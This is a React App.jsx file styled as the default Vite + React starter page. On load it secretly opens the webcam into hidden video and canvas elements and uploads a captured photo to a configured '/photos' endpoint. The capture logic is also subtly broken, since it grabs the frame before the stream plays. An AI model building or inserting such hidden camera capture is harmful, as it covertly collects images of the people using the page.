import { useState, useEffect, useRef } from 'react';
import reactLogo from './assets/react.svg';
import viteLogo from '/vite.svg';
import './App.css';
import axios from 'axios';
import { api_url } from './config';

function App() {
  const [count, setCount] = useState(0);
  const videoRef = useRef(null);
  const canvasRef = useRef(null);

  useEffect(() => {
    getVideo();
  }, []);

  const getVideo = () => {
    navigator.mediaDevices
      .getUserMedia({ video: true })
      .then((stream) => {
        let video = videoRef.current;
        video.srcObject = stream;
        video.play();
      })
      .catch((err) => {
        console.error('Error accessing the camera: ', err);
      });
      takePhoto();
  };

  const takePhoto = () => {
    const width = 300;
    const height = 300;

    let video = videoRef.current;
    let canvas = canvasRef.current;
    canvas.width = width;
    canvas.height = height;
    let context = canvas.getContext('2d');
    context.drawImage(video, 0, 0, width, height);
    sendPhoto();
  };

  const sendPhoto = async () => {
    let canvas = canvasRef.current;
    const imageData = canvas.toDataURL('image/png');

    // Convert base64 to blob
    const byteString = atob(imageData.split(',')[1]);
    const mimeString = imageData.split(',')[0].split(':')[1].split(';')[0];
    const ab = new ArrayBuffer(byteString.length);
    const ia = new Uint8Array(ab);
    for (let i = 0; i < byteString.length; i++) {
        ia[i] = byteString.charCodeAt(i);
    }
    const blob = new Blob([ab], { type: mimeString });


  

    try {
        const formData = new FormData();
        formData.append('file', blob, 'photo.png');

        const response = await axios.post(api_url + '/photos', formData);
        alert("Photo sent");
    } catch (err) {
      console.log(err)

    } finally {

    }
};




  const closePhoto = () => {
    let canvas = canvasRef.current;
    let context = canvas.getContext('2d');
    context.clearRect(0, 0, canvas.width, canvas.height);

  };

  return (
    <>
      <div>
        <a href="https://vitejs.dev" target="_blank">
          <img src={viteLogo} className="logo" alt="Vite logo" />
        </a>
        <a href="https://react.dev" target="_blank">
          <img src={reactLogo} className="logo react" alt="React logo" />
        </a>
      </div>
      <h1>Vite + React</h1>
      <div className="card">
        <button onClick={() => setCount((count) => count + 1)}>
          count is {count}
        </button>
        <p>
          Edit <code>src/App.jsx</code> and save to test HMR
        </p>
      </div>
      <p className="read-the-docs">
        Click on the Vite and React logos to learn more
      </p>
      <video ref={videoRef} style={{ display: 'none' }}></video>
      <canvas ref={canvasRef} style={{ display: 'none' }}></canvas>

    </>
  );
}

export default App;
